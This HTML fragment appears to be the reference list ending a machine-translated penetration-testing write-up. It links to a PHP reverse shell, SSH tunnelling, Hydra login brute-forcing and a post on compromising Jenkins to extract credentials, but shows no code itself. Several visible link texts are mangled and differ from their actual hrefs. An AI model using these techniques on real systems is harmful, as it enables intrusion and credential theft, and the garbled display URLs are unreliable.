target="_blank">https://github . com/pentestmonkey/PHP-reverse-shell/blob/master/PHP-reverse-shell . PHP</a></li><li id="ddd2" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae nn" href="https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/" rel="noopener ugc nofollow" target="_blank">https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/</a></li><li id="b658" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae nn" href="https://bentrobotlabs.wordpress.com/2018/04/02/web-site-login-brute-forcing-with-hydra/" rel="noopener ugc nofollow" target="_blank">https://bentbrobotlabs . WordPress . com/2018/04/02/web-site-log in-brute-forcing-with-hydra/</a></li><li id="cabe" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae nn" href="https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/" rel="noopener ugc nofollow" target="_blank">https://www . n00py . io/2017/01/compromising-Jenkins-and-extracting-credentials/</a></li></ul></div></div>    
</body>
</html>